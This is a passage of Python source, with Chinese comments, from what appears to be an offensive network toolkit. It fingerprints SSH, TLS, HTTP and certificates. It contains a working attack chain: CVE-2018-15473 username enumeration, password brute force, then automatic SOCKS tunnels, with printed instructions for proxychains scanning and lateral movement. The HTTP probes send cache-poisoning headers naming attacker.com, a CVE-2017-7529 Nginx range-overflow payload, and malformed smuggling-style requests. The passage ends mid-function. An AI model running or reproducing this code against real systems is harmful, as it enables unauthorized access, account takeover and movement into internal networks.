    # 2. 并发容量探测
    try:
        start = time.time()
        # 同时发起3个连接
        tasks = [ssh_single_kex_time(host, port, normal_template, timeout) for _ in range(3)]
        concurrent_times = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 处理异常结果
        valid_times = [t for t in concurrent_times if isinstance(t, (int, float)) and t > 0]
        
        if len(valid_times) >= 2:
            time_variance = max(valid_times) - min(valid_times)
            avg_time = sum(valid_times) / len(valid_times)
            variance_ratio = time_variance / avg_time if avg_time > 0 else 0
            
            results.append([
                "concurrent-capacity", 
                f"success:{len(valid_times)}/3",
                f"variance:{time_variance}ms",
                f"avg:{avg_time:.1f}ms",
                f"ratio:{variance_ratio:.2f}",
                "",
                int(variance_ratio * 1000)
            ])
        else:
            results.append(["concurrent-capacity", "failed", "insufficient_data", "", "", "", 0])
            
    except Exception as e:
        results.append(["concurrent-capacity", f"[exc] {e}", "", "", "", "", 0])
    
    # 3. 算法协商记忆测试（超长算法列表）
    try:
        # 生成超长算法列表
        stress_template = ("memory-stress",
                          ["valid-kex"] + [f"fake-kex-{i}@stress.test" for i in range(50)],
                          ["ssh-rsa"] + [f"fake-hostkey-{i}" for i in range(30)],
                          ["aes128-ctr"] + [f"fake-cipher-{i}" for i in range(40)],
                          ["hmac-sha2-256"] + [f"fake-mac-{i}" for i in range(30)],
                          ["none"],
                          [])
        
        # 发送超长列表
        stress_time = await ssh_single_kex_time(host, port, stress_template, timeout)
        
        # 紧接着发送正常请求
        post_stress_time = await ssh_single_kex_time(host, port, normal_template, timeout)
        
        # 再发送一次正常请求作为对照
        control_time = await ssh_single_kex_time(host, port, normal_template, timeout)
        
        # 计算记忆效应
        memory_effect = post_stress_time - control_time
        
        results.append([
            "algorithm-memory",
            f"stress:{stress_time}ms",
            f"post:{post_stress_time}ms",
            f"control:{control_time}ms", 
            f"effect:{memory_effect}ms",
            "",
            abs(int(memory_effect))
        ])
        
    except Exception as e:
        results.append(["algorithm-memory", f"[exc] {e}", "", "", "", "", 0])
    
    return results

async def ssh_single_kex_time(host, port, template, timeout=5.0):
    """执行单次SSH KEX并返回耗时（毫秒）"""
    name, kex, hka, ciph, macs, comp, langs = template
    start = time.time()
    
    try:
        # *** MODIFIED FOR PROXY ***
        if PROXY_ENABLED:
            reader, writer = await asyncio.wait_for(
                open_connection(proxy_url=PROXY_URL, host=host, port=port), 
                timeout=timeout
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
        
        my_id = b"SSH-2.0-EchoDiffFP_Temporal_0.2\r\n"
        sid = await asyncio.wait_for(reader.readline(), timeout=timeout)
        
        if not sid or not sid.startswith(b"SSH-"):
            writer.write(my_id)
            await writer.drain()
            sid = await asyncio.wait_for(reader.readline(), timeout=timeout)
        else:
            writer.write(my_id)
            await writer.drain()
            
        pkt = build_kexinit_payload(kex, hka, ciph, macs, comp, langs)
        writer.write(pkt)
        await writer.drain()
        
        # 等待响应或断开
        try:
            hdr = await asyncio.wait_for(reader.read(5), timeout=timeout/2)
            if len(hdr) == 5:
                pkt_len = struct.unpack(">I", hdr[:4])[0]
                await asyncio.wait_for(reader.read(min(pkt_len-1, 1024)), timeout=timeout/2)
        except asyncio.TimeoutError:
            pass  # 超时是正常的，说明服务器拒绝了连接
            
        writer.close()
        await writer.wait_closed()
        
    except Exception:
        pass  # 异常也是正常的，记录时间即可
    
    return int((time.time() - start) * 1000)

# 清晨打开窗增强版本
async def first_door_attack_extended(host, port, userlist, passlist, timeout=5.0):
    """清晨打开窗增强版本"""
    
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Userlist: {len(userlist)} users")
    print(f"[*] Passlist: {len(passlist)} passwords")
    
    print("\n[*] Phase 1: CVE-2018-15473 User Enumeration + Timing Analysis")
    print("="*60)
    
    try:
        # NOTE: This part needs modification if time_mch module also makes direct connections
        # Assuming it uses paramiko which respects proxies, or needs to be modified.
        # For this example, we assume it will work through a proxified environment.
        # Ensure proxy settings are propagated to time_mch
        try:
            import time_mch as _tm
            _tm.PROXY_ENABLED = PROXY_ENABLED
            _tm.PROXY_URL = PROXY_URL
        except Exception:
            pass
        valid_users, timing_profiles = await cve_2018_15473_enum(host, port, userlist, timeout)
        
        if not valid_users:
            print("[-] No valid users found via CVE-2018-15473")
            return False
        
        print(f"[+] Found {len(valid_users)} valid users:")
        for user in valid_users:
            profile = timing_profiles[user]
            print(f"    {user}: avg={profile['avg_time']:.1f}ms, significance={profile['significance']:.2f}")
        
        print(f"\n[*] Phase 2: Optimized Credential Attack")
        print("="*60)
        print(f"[*] Estimated attempts: {len(valid_users) * len(passlist)} (without optimization)")
        
        success = await optimized_bruteforce(host, port, valid_users, timing_profiles, passlist)
        
        if success:
            print(f"\n[+] Successfully compromised {len(success)} accounts:")
            for username, password in success:
                print(f"    {username}:{password}")
            
            print(f"\n[*] Phase 3: Automatic Tunnel Establishment")
            print("="*60)
            
            # 使用第一个成功的凭据建立隧道基础设施
            username, password = success[0]
            from time_mch import auto_establish_tunnels
            # Ensure time_mch uses our proxy settings if configured
            try:
                import time_mch as _tm
                _tm.PROXY_ENABLED = PROXY_ENABLED
                _tm.PROXY_URL = PROXY_URL
            except Exception:
                pass
            tunnel_info = await auto_establish_tunnels(host, port, username, password)
            
            print(f"\n[+] Tunnel infrastructure ready:")
            print(f"    SOCKS5 Proxy: {tunnel_info['socks_proxy']}")
            print(f"    Active tunnels: {len(tunnel_info['tunnels'])}")
            
            for tunnel in tunnel_info['tunnels']:
                if tunnel.get('status') == 'active':
                    print(f"    127.0.0.1:{tunnel['local_port']} -> {tunnel['service']}:{tunnel['remote_port']}")
            
            print(f"\n[*] Internal reconnaissance script generated")
            print(f"[*] Ready for lateral movement and privilege escalation")
            
            # 生成使用说明
            print(f"\n" + "="*60)
            print(f"USAGE INSTRUCTIONS:")
            print(f"="*60)
            print(f"# Configure proxychains:")
            print(f"echo 'socks5 127.0.0.1 9999' >> /etc/proxychains.conf")
            print(f"")
            print(f"# Use tunneled tools:")
            print(f"proxychains nmap -sT 10.0.0.0/24")
            print(f"proxychains curl http://internal-server/")
            print(f"")
            print(f"# Direct port access:")
            for tunnel in tunnel_info['tunnels'][:3]:  # 显示前3个
                if tunnel.get('status') == 'active':
                    service = tunnel['service']
                    local_port = tunnel['local_port']
                    if service == 'MySQL':
                        print(f"mysql -h 127.0.0.1 -P {local_port} -u root -p")
                    elif service == 'HTTP':
                        print(f"curl http://127.0.0.1:{local_port}/")
                    elif service == 'SSH':
                        print(f"ssh user@127.0.0.1 -p {local_port}")
            
            return True
        else:
            print("[-] Failed to obtain valid credentials")
            return False
            
    except Exception as e:
        print(f"[-] Attack chain failed: {e}")
        return False

# 最小ClientHello构造和Alert解析 TLSv1.0/1.2 风格

def tls_client_hello(template_name, server_name=None):
    rnd = os.urandom(32)
    session = b""
    comp_methods = b"\x01\x00"  # null compression
    if template_name == "sane-modern":
        vers = b"\x03\x03"  # TLS1.2
        ciphers = b"\x00\x13\xc0\x2f\xc0\x30\x00\x9c\x00\x9d\xcc\xa9\xcc\xa8"
        exts = []
        if server_name:
            sni = b"\x00\x00" + struct.pack(">H", 5+len(server_name)) + struct.pack(">H", len(server_name)+3) + b"\x00" + struct.pack(">H", len(server_name)) + server_name.encode()
            exts.append(sni)
        # supported_groups/EC point formats minimal
        exts.append(b"\x00\x0a\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18")
        extensions = b"".join(exts)
    elif template_name == "incoherent":
        vers = b"\x03\x01"  # TLS1.0
        ciphers = b"\x00\xff\x56\x00"  # GREASE-ish/invalid
        extensions = b"\xaa\xaa\x00\x01\x00"  # 未知扩展
    elif template_name == "no-sni":
        vers = b"\x03\x03"
        ciphers = b"\x00\x2f\x00\x35"  # AES128-SHA/AES256-SHA
        extensions = b""
    elif template_name == "bad-ext":
        vers = b"\x03\x03"
        ciphers = b"\x00\x2f"
        extensions = b"\xbe\xef\x00\x00"  # 假空分机
    else:
        vers = b"\x03\x03"; ciphers = b"\x00\x2f"; extensions = b""

    # 请他妈跟我握手！
    ch = b"\x01" + struct.pack(">I", 2+32+1+len(session)+2+len(ciphers)+len(comp_methods)+2+len(extensions))[1:] \
         + vers + rnd + bytes([len(session)]) + session \
         + struct.pack(">H", len(ciphers)) + ciphers \
         + comp_methods \
         + struct.pack(">H", len(extensions)) + extensions

    # 记录：类型=22 握手，版本=0x0301 长度
    rec = b"\x16\x03\x01" + struct.pack(">H", len(ch)) + ch
    return rec

TLS_ALERT_DESCR = {
    0: "close_notify", 10:"unexpected_message", 20:"bad_record_mac", 40:"handshake_failure",
    42:"bad_certificate",43:"unsupported_certificate", 44:"certificate_revoked",
    45:"certificate_expired",46:"certificate_unknown",47:"illegal_parameter",
    48:"unknown_ca",49:"access_denied",50:"decode_error",51:"decrypt_error",
    60:"export_restriction",70:"protocol_version",71:"insufficient_security",
    80:"internal_error",86:"inappropriate_fallback",90:"user_canceled",112:"unrecognized_name",
    109:"missing_extension", 110:"unsupported_extension",
}

def run_tls_fp(host, port, timeout=5.0, server_name=None):
    templates = ["sane-modern","incoherent","no-sni","bad-ext"]
    rows = []
    for t in templates:
        res = "NO_REPLY"; detail = ""; took = 0
        try:
            start = time.time()
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.settimeout(timeout)
                rec = tls_client_hello(t, server_name=server_name)
                s.sendall(rec)
                hdr = s.recv(5)
                if len(hdr) == 5:
                    ctype, vmaj, vmin, ln = hdr[0], hdr[1], hdr[2], struct.unpack(">H", hdr[3:5])[0]
                    body = b""
                    while len(body) < ln:
                        chunk = s.recv(ln - len(body))
                        if not chunk: break
                        body += chunk
                    if ctype == 21 and len(body) >= 2:  # Alert
                        level, desc = body[0], body[1]
                        res = f"ALERT {level}/{desc}({TLS_ALERT_DESCR.get(desc,'?')})"
                        detail = f"v{vmaj}.{vmin} len={ln}"
                    else:
                        res = f"TYPE {ctype} v{vmaj}.{vmin} len={ln}"
                        detail = md5s(body)[:12]
            took = int((time.time()-start)*1000)
        except Exception as e:
            res = f"[exc] {e}"
        rows.append([t, res, detail, took])
    return rows

async def tls_probe_single(host, port, template, timeout=5.0, server_name=None):
    """单次TLS探测"""
    start = time.time()
    res = "NO_REPLY"
    detail = ""

    attempts = (DEFAULT_RETRIES or 0) + 1

    for attempt in range(1, attempts + 1):
        try:
            # 智能连接：按策略决定是否直连
            if PROXY_ENABLED:
                reader, writer = await asyncio.wait_for(
                    smart_open_connection(proxy_url=PROXY_URL, host=host, port=port, force_direct_tls=True), 
                    timeout=timeout
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=timeout
                )
            
            rec = tls_client_hello(template, server_name=server_name)
            writer.write(rec)
            await writer.drain()
            
            hdr = await asyncio.wait_for(reader.read(5), timeout=timeout)
            if len(hdr) == 5:
                ctype, vmaj, vmin, ln = hdr[0], hdr[1], hdr[2], struct.unpack(">H", hdr[3:5])[0]
                body = await asyncio.wait_for(reader.read(ln), timeout=timeout)
                
                if ctype == 21 and len(body) >= 2:  # Alert
                    level, desc = body[0], body[1]
                    res = f"ALERT {level}/{desc}({TLS_ALERT_DESCR.get(desc,'?')})"
                    detail = f"v{vmaj}.{vmin} len={ln}"
                else:
                    res = f"TYPE {ctype} v{vmaj}.{vmin} len={ln}"
                    detail = md5s(body)[:12]
            
            writer.close()
            await writer.wait_closed()
            break
            
        except Exception as e:
            res = classify_exception(e)
            if attempt < attempts and is_transient_error(e):
                log_debug(f"[TLS] transient error, retrying ({attempt}/{attempts-1}): {res}")
                await asyncio.sleep(get_retry_delay(attempt, res))
                continue
            else:
                break
    
    took = int((time.time()-start)*1000)
    return [template, res, detail, took]

async def run_tls_fp_async(host, port, timeout=5.0, server_name=None, samples=1):
    """异步TLS指纹识别"""
    templates = ["sane-modern","incoherent","no-sni","bad-ext"]
    all_results = []
    
    for _ in range(samples):
        tasks = [tls_probe_single(host, port, template, timeout, server_name) for template in templates]
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(batch_results):
            if isinstance(result, Exception):
                result = [templates[i], f"[exc] {result}", "", 0]
            all_results.append(result)
    
    # 按模板分组并计算统计信息
    template_groups = {}
    for result in all_results:
        template_name = result[0]
        if template_name not in template_groups:
            template_groups[template_name] = []
        template_groups[template_name].append(result)
    
    final_rows = []
    for template in templates:
        if template in template_groups:
            group = template_groups[template]
            times = [row[3] for row in group]  # took字段
            mean_ms, median_ms, std_ms = calculate_stats(times)
            
            base_row = group[0].copy()
            base_row[3] = f"{mean_ms}±{std_ms}"
            
            # 计算熵值
            responses = [f"{row[1]}|{row[2]}" for row in group]  # res|detail
            entropy = calculate_entropy(responses)
            base_row.append(entropy)
            
            final_rows.append(base_row)
    
    return final_rows


# CERT-REBEL: TLS/SSH 证书打靶  记得检查攻击链
from datetime import datetime
try:
    import ssl
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    from cryptography.x509.oid import ExtendedKeyUsageOID
except Exception as e:
    ssl = None  # 我们在运行时检查

def _sha256hex(b: bytes) -> str:
    import hashlib
    return hashlib.sha256(b).hexdigest()

def _load_cert_der_to_info(der: bytes, sni_hint: str = None):
    cert = x509.load_der_x509_certificate(der)
    pub = cert.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    spki_sha256 = _sha256hex(pub)[:32]  # 短显示
    cert_sha256 = _sha256hex(cert.public_bytes(Encoding.DER))[:32]
    sig_algo = cert.signature_algorithm_oid._name if hasattr(cert, "signature_algorithm_oid") else "unknown"
    key_bits = None
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519, ed448
        if hasattr(cert.public_key(), "key_size"):
            key_bits = getattr(cert.public_key(), "key_size", None)
        elif isinstance(cert.public_key(), ec.EllipticCurvePublicKey):
            key_bits = cert.public_key().curve.key_size
    except Exception:
        pass

    ku = eku = bc = None
    has_server_auth = None
    try:
        ku = cert.extensions.get_extension_for_class(x509.KeyUsage).value
    except Exception:
        pass
    try:
        eku = cert.extensions.get_extension_for_class(x509.ExtendedKeyUsage).value
        has_server_auth = any(oid.dotted_string == ExtendedKeyUsageOID.SERVER_AUTH.dotted_string for oid in eku)
    except Exception:
        has_server_auth = False
    try:
        bc = cert.extensions.get_extension_for_class(x509.BasicConstraints).value
    except Exception:
        pass

    san_names = []
    try:
        san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
        san_names = san.get_values_for_type(x509.DNSName)
    except Exception:
        pass

    subj = cert.subject.rfc4514_string()
    issr = cert.issuer.rfc4514_string()
    # 🔧 使用新的UTC时间属性，避免deprecation warning
    try:
        nb = cert.not_valid_before_utc
        na = cert.not_valid_after_utc
    except AttributeError:
        # 回退到旧属性（兼容旧版本cryptography）
        nb = cert.not_valid_before
        na = cert.not_valid_after

    # 逻辑告警  
    warns = []
    now = datetime.utcnow()
    # 🔧 修复时间比较错误，处理时区问题
    try:
        # 移除时区信息进行比较
        nb_naive = nb.replace(tzinfo=None) if hasattr(nb, 'tzinfo') and nb.tzinfo else nb
        na_naive = na.replace(tzinfo=None) if hasattr(na, 'tzinfo') and na.tzinfo else na
        if na_naive < now: warns.append("expired")
        if nb_naive > now: warns.append("notYetValid")
    except Exception:
        # 时间比较失败，跳过时间相关警告
        pass
    if bc and bc.ca: warns.append("leafCA_true")
    if has_server_auth is False: warns.append("no_serverAuth")
    if key_bits and isinstance(key_bits, int) and key_bits < 2048: warns.append(f"weak_key_{key_bits}")
    if sig_algo and ("sha1" in sig_algo.lower() or "md5" in sig_algo.lower()): warns.append(f"weak_sig_{sig_algo}")
    if sni_hint and san_names and sni_hint.lower() not in [x.lower() for x in san_names]: 
        warns.append("SAN_no_SNI")

    return {
        "spki": spki_sha256,
        "cert": cert_sha256,
        "sig": sig_algo,
        "bits": key_bits or "",
        "cn": subj,
        "issuer": issr,
        "nb": nb.strftime("%Y-%m-%d"),
        "na": na.strftime("%Y-%m-%d"),
        "san": len(san_names),
        "warns": ",".join(warns) if warns else ""
    }

async def _grab_tls_leaf_cert_async(host: str, port: int, sni: str, timeout: float = 5.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # 🔧 统一使用直连方式，与SSH检测保持一致
    # 因为SSH指纹检测已经证明直连是有效的
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(host, port, ssl=ctx, server_hostname=sni or host),
        timeout=timeout
    )
    try:
        sslobj = writer.get_extra_info('ssl_object') if hasattr(writer, 'get_extra_info') else None
        if sslobj is None:
            # Fallback to transport extra info
            transport = writer.transport if hasattr(writer, 'transport') else None
            if transport:
                sslobj = transport.get_extra_info('ssl_object')
        if sslobj is None:
            raise RuntimeError('no ssl_object available')
        der = sslobj.getpeercert(True)
        return der, "ok"
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


def _grab_tls_leaf_cert(host: str, port: int, sni: str, timeout: float = 5.0):
    if ssl is None:
        return None, "[err] cryptography/ssl not available"
    try:
        # 总是使用 asyncio.run() 来执行异步函数，这是最简单可靠的方式
        # 并且直接 await async 函数的调用
        return asyncio.run(_grab_tls_leaf_cert_async(host, port, sni, timeout))
    except Exception as e:
        return None, classify_exception(e)

async def _open_proxied_socket_async(host: str, port: int, timeout: float = 5.0):
    proxy = Proxy.from_url(PROXY_URL)
    sock = await asyncio.wait_for(proxy.connect(dest_host=host, dest_port=port), timeout=timeout)
    try:
        sock.settimeout(timeout)
    except Exception:
        pass
    return sock


def _open_proxied_socket_sync(host: str, port: int, timeout: float = 5.0):
    try:
        loop = asyncio.get_running_loop()
        # We're in an async context, this sync function shouldn't be called
        raise RuntimeError("Cannot call sync function from async context")
    except RuntimeError as e:
        if "no running event loop" in str(e).lower():
            # No event loop running, safe to use asyncio.run()
            return asyncio.run(_open_proxied_socket_async(host, port, timeout))
        else:
            # Re-raise the error if it's a different RuntimeError
            raise


def _try_ssh_hostkey_sha256(host: str, port: int, timeout: float = 5.0):
    try:
        import paramiko
    except Exception:
        return "", "[skip] paramiko not installed"
    try:
        # 🔧 统一使用直连方式，与ssh_fp检测保持一致
        # 因为ssh_fp已经证明直连是有效的
        sock = socket.create_connection((host, port), timeout=timeout)
        t = paramiko.Transport(sock)
        t.start_client(timeout=timeout)
        k = t.get_remote_server_key()
        fp = _sha256hex(k.asbytes())[:32]
        t.close()
        return fp, "ok"
    except Exception as e:
        return "", classify_exception(e)

def _try_ssh_hostkey_multi_ports(host: str, timeout: float = 5.0):
    """尝试多个SSH端口，优先22000，然后22"""
    # 优先22000端口，因为这是当前目标的实际SSH端口
    ssh_ports = [22000, 22]
    last_error = None
    
    for port in ssh_ports:
        fp, status = _try_ssh_hostkey_sha256(host, port, timeout)
        if fp and "ok" in status:
            return fp, f"ok (port {port})"
        else:
            last_error = status
    
    # 如果都失败了，提供更详细的错误信息
    log_debug(f"[SSH] Hostkey获取失败，但可能SSH服务仍可用于指纹检测")
    return "", f"hostkey failed on ports {ssh_ports} ({last_error})"

def cert_rebel_probe(host: str, tls_port: int, sni_list, ssh_port: int = 22, timeout: float = 5.0):
    """
    返回两张表：
      1) TLS 证书体征表
      2) SSH HostKey 指纹（可选）
    """
    tls_rows = []
    # Normalize SNI candidates to a list to avoid iterating non-iterables (e.g., bool)
    try:
        if isinstance(sni_list, (list, tuple, set)):
            sni_candidates = list(sni_list)
        elif isinstance(sni_list, str):
            sni_candidates = [sni_list]
        else:
            sni_candidates = [host]
    except Exception:
        sni_candidates = [host]

    for sni in (sni_candidates or [host]):
        try:
            der, status = _grab_tls_leaf_cert(host, tls_port, sni, timeout)
            if der:
                info = _load_cert_der_to_info(der, sni_hint=sni)
                tls_rows.append([
                    sni, info["spki"], info["cert"], info["sig"], info["bits"],
                    info["san"], info["nb"], info["na"], info["warns"]
                ])
            else:
                tls_rows.append([sni, "", "", "", "", "", "", "", status])
        except Exception as e:
            # 🔧 增强错误处理，避免端口解析错误中断整个函数
            error_msg = f"[exc] {type(e).__name__}: {str(e)}"
            tls_rows.append([sni, "", "", "", "", "", "", "", error_msg])
            log_debug(f"[cert_rebel_probe] TLS连接失败 {sni}: {e}")

    # 使用多端口检测，优先22000然后22
    ssh_fp, ssh_status = _try_ssh_hostkey_multi_ports(host, timeout)
    ssh_rows = [["ssh_hostkey", ssh_fp or "-", ssh_status]]

    return tls_rows, ssh_rows

#历史对比：把当前 SPKI/SSH 指纹集合与 cache CSV 做 Jaccard 对比，标出“复用/新增/消失”
def cert_rebel_compare_and_cache(cache_path: str, host: str, tls_rows, ssh_rows):
    if not cache_path:
        return None
    import csv, os
    curr = set()
    for r in tls_rows:
        if r[1]: curr.add(("TLS_SPki", r[1]))
    for r in ssh_rows:
        if r[1] and r[1] != "-": curr.add(("SSH_HostKey", r[1]))

    prev = set()
    if os.path.exists(cache_path):
        with open(cache_path, "r", encoding="utf-8") as f:
            rd = csv.reader(f)
            for row in rd:
                if len(row) >= 2:
                    prev.add((row[0], row[1]))
    # 写入（覆盖为最新全集）
    with open(cache_path, "w", newline="", encoding="utf-8") as f:
        wr = csv.writer(f)
        for t, v in sorted(curr):
            wr.writerow([t, v, host])

    # 返回对比结果
    inter = curr & prev
    add = curr - prev
    gone = prev - curr
    return {
        "common": len(inter),
        "new": len(add),
        "gone": len(gone)
    }



# HTTP 模块
def run_http_fp(host, port, timeout=5.0):
    probes = [
        ("HEAD-odd-host", "HEAD", "/404_does_not_exist", {"Host":"."}),
        ("HEAD-norm", "HEAD", "/robots.txt", {"Host":host}),
        ("HEAD-bust", "HEAD", f"/robots.txt?_={int(time.time())}", {"Host":host}),
    ]
    rows = []
    for name, method, path, headers in probes:
        status = "NO_REPLY"; server=""; xcache=""; clen=""; detail=""; took=0
        try:
            start = time.time()
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.settimeout(timeout)
                lines = [f"{method} {path} HTTP/1.1"]
                hdrs = {"User-Agent":"EchoDiffFP/0.2","Connection":"close","Accept":"*/*"}
                hdrs.update(headers or {})
                for k,v in hdrs.items(): lines.append(f"{k}: {v}")
                lines.append("\r\n")
                req = ("\r\n".join(lines)).encode()
                s.sendall(req)
                data = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    data += chunk
                    if b"\r\n\r\n" in data: break
                head = data.split(b"\r\n\r\n",1)[0]
                head_lines = head.decode("iso-8859-1","replace").split("\r\n")
                status = head_lines[0] if head_lines else ""
                location = ""
                for hl in head_lines[1:]:
                    if hl.lower().startswith("server:"): 
                        server = hl.split(":",1)[1].strip()
                    elif hl.lower().startswith("location:"):
                        location = hl.split(":",1)[1].strip()
                    elif "x-cache" in hl.lower() or "x-proxy-cache" in hl.lower() or "via:" in hl.lower():
                        xcache += "["+hl.strip()+"]"
                    elif hl.lower().startswith("content-length:"): 
                        clen = hl.split(":",1)[1].strip()
                # 构建详细信息字段
                detail = location if location else clen
            took = int((time.time()-start)*1000)
        except Exception as e:
            status = f"[exc] {e}"
        rows.append([name, status, server, detail, xcache[:60], took])
    return rows

async def http_probe_single(host, port, probe, timeout=5.0):
    """单次HTTP探测"""
    name, method, path, headers = probe
    status = "NO_REPLY"
    server = ""
    xcache = ""
    clen = ""
    detail = ""
    took = 0

    attempts = (DEFAULT_RETRIES or 0) + 1
    last_exc = None

    for attempt in range(1, attempts + 1):
        try:
            start = time.time()

            # 构建连接（支持代理 + TLS）
            if PROXY_ENABLED:
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        open_connection(proxy_url=PROXY_URL, host=host, port=port, ssl_context=ctx, server_hostname=host),
                        timeout=timeout
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        open_connection(proxy_url=PROXY_URL, host=host, port=port),
                        timeout=timeout
                    )
            else:
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
                        timeout=timeout
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=timeout)

            lines = [f"{method} {path} HTTP/1.1"]
            hdrs = {"User-Agent":"EchoDiffFP/0.2","Connection":"close","Accept":"*/*"}
            hdrs.update(headers or {})
            for k,v in hdrs.items():
                lines.append(f"{k}: {v}")
            lines.append("\r\n")
            req = ("\r\n".join(lines)).encode()

            writer.write(req)
            await writer.drain()

            data = b""
            full_response = b""
            max_response_size = 32768  # 32KB global limit for all responses
            
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data += chunk
                full_response += chunk
                
                # Apply global size limit to prevent memory exhaustion
                if len(full_response) > max_response_size:
                    log_debug(f"[HTTP] Response size limit exceeded ({max_response_size} bytes)")
                    break
                    
                if name in ["ERROR-page", "CACHE-poison"]:
                    if len(full_response) > 8192:
                        break
                else:
                    if b"\r\n\r\n" in data:
                        break

            head = data.split(b"\r\n\r\n",1)[0]
            head_lines = head.decode("iso-8859-1","replace").split("\r\n")
            status = head_lines[0] if head_lines else ""

            # 获取响应体用于高级分析
            response_body = ""
            if b"\r\n\r\n" in data:
                response_body = data.split(b"\r\n\r\n",1)[1].decode("utf-8", "ignore")
            elif full_response:
                response_body = full_response.decode("utf-8", "ignore")

            # 增强响应解析：提取关键头部信息
            location = ""
            for hl in head_lines[1:]:
                if hl.lower().startswith("server:"):
                    server = hl.split(":",1)[1].strip()
                elif hl.lower().startswith("location:"):
                    location = hl.split(":",1)[1].strip()
                elif "x-cache" in hl.lower() or "x-proxy-cache" in hl.lower() or "via:" in hl.lower():
                    xcache += "["+hl.strip()+"]"
                elif hl.lower().startswith("content-length:"):
                    clen = hl.split(":",1)[1].strip()

            writer.close()
            await writer.wait_closed()
            took = int((time.time()-start)*1000)

            # 构建详细信息字段 - 通用+专项分析（在took计算后执行）
            if name == "ERROR-page":
                detail = analyze_error_page_tech_stack(response_body, status)
            elif name == "CACHE-poison":
                detail = analyze_cache_poisoning_response(response_body, head_lines, location)
            elif name == "CVE-2017-7529":
                detail = analyze_cve_2017_7529_response(status, response_body, took)
            elif name == "Cache-Poison-1.12.2":
                detail = analyze_nginx_cache_poison_1_12_2(response_body, head_lines, location)
            elif name == "HTTP2-Range-Overflow":
                detail = analyze_http2_range_overflow(status, response_body, took)
            else:
                detail = location if location else clen

            # success path -> break retry loop
            last_exc = None
            break

        except Exception as e:
            last_exc = e
            status = classify_exception(e)
            took = 0
            if attempt < attempts and is_transient_error(e):
                log_debug(f"[HTTP] transient error, retrying ({attempt}/{attempts-1}): {status}")
                await asyncio.sleep(get_retry_delay(attempt, status))
                continue
            else:
                break

    return [name, status, server, detail, xcache[:60], took]

async def run_http_fp_async(host, port, timeout=5.0, samples=1):
    """异步HTTP指纹识别"""
    probes = [
        ("HEAD-odd-host", "HEAD", "/404_does_not_exist", {"Host":"."}),
        ("HEAD-norm", "HEAD", "/robots.txt", {"Host":host}),
        ("HEAD-bust", "HEAD", f"/robots.txt?_={int(time.time())}", {"Host":host}),
        # 通用高价值探针
        ("ERROR-page", "GET", "/nonexistent_page_for_tech_detection", {"Host":host}),
        ("CACHE-poison", "GET", "/", {"Host": f"evil.{host}", "X-Forwarded-Host": "attacker.com"}),
        # Nginx 1.12.2 专项极限攻击探针
        ("CVE-2017-7529", "GET", "/", {"Range": "bytes=0-18446744073709551615"}),
        ("Cache-Poison-1.12.2", "GET", "/", {"Host": f"evil.{host}", "X-Original-URL": "/admin"}),
        ("HTTP2-Range-Overflow", "GET", "/", {"Range": "bytes=0-" + "9" * 100}),
    ]
    
    all_results = []
    
    for _ in range(samples):
        tasks = [http_probe_single(host, port, probe, timeout) for probe in probes]
        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(batch_results):
            if isinstance(result, Exception):
                result = [probes[i][0], f"[exc] {result}", "", "", "", 0]
            all_results.append(result)
    
    # 按探针名分组并计算统计信息
    probe_groups = {}
    for result in all_results:
        probe_name = result[0]
        if probe_name not in probe_groups:
            probe_groups[probe_name] = []
        probe_groups[probe_name].append(result)
    
    final_rows = []
    for probe_name, _, _, _ in probes:
        if probe_name in probe_groups:
            group = probe_groups[probe_name]
            times = [row[5] for row in group]  # took字段
            mean_ms, median_ms, std_ms = calculate_stats(times)
            
            base_row = group[0].copy()
            base_row[5] = f"{mean_ms}±{std_ms}"
            
            # 计算熵值
            responses = [f"{row[1]}|{row[2]}|{row[3]}" for row in group]  # status|server|detail
            entropy = calculate_entropy(responses)
            base_row.append(entropy)
            
            final_rows.append(base_row)
    
    return final_rows


def run_http_extreme_fp(host, port=80, timeout=5.0):
    probes = [
        ("double-cl", 
         "GET / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 5\r\nContent-Length: 10\r\n\r\n"),
        ("lf-only", 
         "GET / HTTP/1.1\nHost: {h}\n\n"),
        ("bad-te", 
         "POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\n\r\nnot_a_chunk"),
        ("http-1.0", 
         "GET / HTTP/1.0\r\nHost: {h}\r\n\r\n"),
    ]
    rows = []
    import socket, time
    for name, raw in probes:
        frag = ""
        try:
            start = time.time()
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.sendall(raw.format(h=host).encode())
                data = s.recv(256)  # 只取前 256 字节作 fingerprint
                frag = data.decode("iso-8859-1","replace").replace("\r"," ").replace("\n"," ")[:120]
            ms = int((time.time()-start)*1000)
            rows.append([name, frag, ms])
        except Exception as e:
